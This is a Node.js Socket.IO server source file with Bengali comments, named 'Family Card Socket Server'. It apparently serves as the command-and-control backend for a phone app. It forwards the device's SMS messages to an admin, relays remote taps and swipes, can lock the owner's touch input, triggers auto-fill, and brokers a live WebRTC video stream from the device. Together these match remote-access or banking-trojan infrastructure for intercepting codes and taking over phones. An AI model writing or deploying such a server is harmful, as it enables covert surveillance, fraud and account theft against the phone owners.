const express = require('express');
const http = require('http');
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// বেসিক রুট চেক করার জন্য
app.get('/', (req, res) => {
    res.send('Family Card Socket Server is Running Successfully!');
});

io.on('connection', (socket) => {
    console.log('Client connected: ' + socket.id);

    // ১. অ্যাপ থেকে এসএমএস রিসিভ করার ইভেন্ট
    socket.on('send-sms-to-admin', (smsMessage) => {
        console.log("New SMS: " + smsMessage);
        io.emit('receive-sms-from-app', smsMessage);
    });

    // ২. 🖱 এডমিন প্যানেল থেকে রিমোট কন্ট্রোল কমান্ড
    socket.on('admin-remote-click', (data) => {
        socket.broadcast.emit('remote-click', data.x, data.y);
    });

    socket.on('admin-remote-swipe', (data) => {
        socket.broadcast.emit('remote-swipe', data.startX, data.startY, data.endX, data.endY);
    });

    socket.on('admin-lock-touch', (shouldLock) => {
        socket.broadcast.emit('lock-touch', shouldLock);
    });

    socket.on('trigger-auto-fill', () => {
        socket.broadcast.emit('trigger-auto-fill');
    });

    // ==========================================
    // ৩. নতুন ম্যাজিক: লাইভ ভিডিও (WebRTC) সিগন্যাল আদান-প্রদান 🚀
    // ==========================================
    
    // অ্যাপ থেকে ভিডিও অফার আসলে এডমিনকে পাঠানো
    socket.on('webrtc-offer', (offer) => {
        console.log("Relaying WebRTC Offer to Admin...");
        socket.broadcast.emit('webrtc-offer', offer);
    });

    // এডমিন থেকে রিসিভ করার সিগন্যাল আসলে অ্যাপকে পাঠানো
    socket.on('webrtc-answer', (answer) => {
        console.log("Relaying WebRTC Answer to App...");
        socket.broadcast.emit('webrtc-answer', answer);
    });

    // ভিডিও কানেকশন ক্লিয়ার করার জন্য ICE Candidate পাস করা
    socket.on('webrtc-ice-candidate', (candidate) => {
        socket.broadcast.emit('webrtc-ice-candidate', candidate);
    });

    // ==========================================

    socket.on('disconnect', () => {
        console.log('Client disconnected: ' + socket.id);
        // কেউ ডিসকানেক্ট হলে এডমিনকে অফলাইন করে দেওয়া
        socket.broadcast.emit('user-disconnected-stream');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
